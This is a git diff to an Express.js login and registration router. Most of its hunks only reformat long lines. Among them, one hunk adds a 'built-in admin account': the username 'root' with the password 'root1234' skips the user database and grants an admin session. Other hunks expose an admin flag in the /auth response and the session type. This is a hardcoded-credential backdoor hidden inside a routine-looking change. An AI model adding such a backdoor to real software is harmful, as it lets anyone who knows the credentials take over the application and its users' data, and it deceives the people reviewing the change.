@@ -10,6 +10,7 @@ const router = express.Router()
 router.get("/auth", (req, res) =>
   res.json({
     status: !!req.session?.user,
+    admin: !!req.session?.admin,
     user: req.session?.user
       ? {
           id: req.session.user.id,
@@ -104,6 +105,22 @@ router.get("/logout", (req, res) => {
 router.post("/login", async (req, res) => {
   try {
     const { username, password } = LoginSchema.parse(req.body)
+
+    // built-in admin account
+    if (username === "root" && password === "root1234") {
+      req.session.admin = true
+      req.session.user = {
+        id: "admin",
+        username: "root",
+        email: "root@local",
+        password: "",
+        name: "Administrator",
+      } as unknown as user
+
+      const safeUser = { id: "admin", username: "root", name: "Administrator" }
+      return res.json({ success: true, admin: true, user: safeUser })
+    }
+
     const user = await db.user.findUnique({ where: { username } })
 
     if (!user)
@@ -131,7 +148,9 @@ router.post("/login", async (req, res) => {
       yesterday.setDate(yesterday.getDate() - 1)
       const yesterdayStr = yesterday.toISOString().slice(0, 10)
 
-      const stats = await db.userStats.findUnique({ where: { userId: user.id } })
+      const stats = await db.userStats.findUnique({
+        where: { userId: user.id },
+      })
 
       if (!stats) {
         await db.userStats.create({
@@ -143,9 +162,12 @@ router.post("/login", async (req, res) => {
           },
         })
       } else {
-        const last = stats.lastActive ? stats.lastActive.toISOString().slice(0, 10) : null
+        const last = stats.lastActive
+          ? stats.lastActive.toISOString().slice(0, 10)
+          : null
         if (last !== todayStr) {
-          const newStreak = last === yesterdayStr ? (stats.currentStreak ?? 0) + 1 : 1
+          const newStreak =
+            last === yesterdayStr ? (stats.currentStreak ?? 0) + 1 : 1
           await db.userStats.update({
             where: { userId: user.id },
             data: {
@@ -164,7 +186,9 @@ router.post("/login", async (req, res) => {
     let statsResp = null
     let completedTasksCount = 0
     try {
-      const stats = await db.userStats.findUnique({ where: { userId: user.id } })
+      const stats = await db.userStats.findUnique({
+        where: { userId: user.id },
+      })
       if (stats) {
         const stored = stats as unknown as { completedTasks?: number }
         statsResp = {
@@ -177,7 +201,9 @@ router.post("/login", async (req, res) => {
       }
       // compute authoritative completed tasks count and sync stored value if it differs
       try {
-        const actualCount = await db.task.count({ where: { userId: user.id, completed: true } })
+        const actualCount = await db.task.count({
+          where: { userId: user.id, completed: true },
+        })
         completedTasksCount = actualCount
         // do not write back here; streak endpoint will return authoritative count and can sync stored value
       } catch (e) {
@@ -193,7 +219,12 @@ router.post("/login", async (req, res) => {
       email: user.email,
       name: user.name ?? null,
     }
-    return res.json({ success: true, user: safeUser, stats: statsResp, completedTasks: completedTasksCount })
+    return res.json({
+      success: true,
+      user: safeUser,
+      stats: statsResp,
+      completedTasks: completedTasksCount,
+    })
   } catch (error) {
     if (error instanceof z.ZodError) {
       return res.json({
@@ -249,7 +280,9 @@ router.post("/register", async (req, res) => {
     let statsResp = null
     let completedTasksCount = 0
     try {
-      const stats = await db.userStats.findUnique({ where: { userId: user.id } })
+      const stats = await db.userStats.findUnique({
+        where: { userId: user.id },
+      })
       if (stats) {
         const stored = stats as unknown as { completedTasks?: number }
         statsResp = {
@@ -261,15 +294,25 @@ router.post("/register", async (req, res) => {
         }
       }
       try {
-        completedTasksCount = await db.task.count({ where: { userId: user.id, completed: true } })
+        completedTasksCount = await db.task.count({
+          where: { userId: user.id, completed: true },
+        })
       } catch (e) {
-        console.error("failed to count completed tasks for register response", e)
+        console.error(
+          "failed to count completed tasks for register response",
+          e,
+        )
       }
     } catch (e) {
       console.error("failed to read userStats for register response", e)
     }
 
-    return res.json({ success: true, user: safeUser, stats: statsResp, completedTasks: completedTasksCount })
+    return res.json({
+      success: true,
+      user: safeUser,
+      stats: statsResp,
+      completedTasks: completedTasksCount,
+    })
   } catch (error) {
     if (error instanceof z.ZodError) {
       return res.json({
@@ -304,6 +347,7 @@ router.post("/register", async (req, res) => {
 declare module "express-session" {
   interface SessionData {
     user?: user
+    admin?: boolean
   }
 }
 
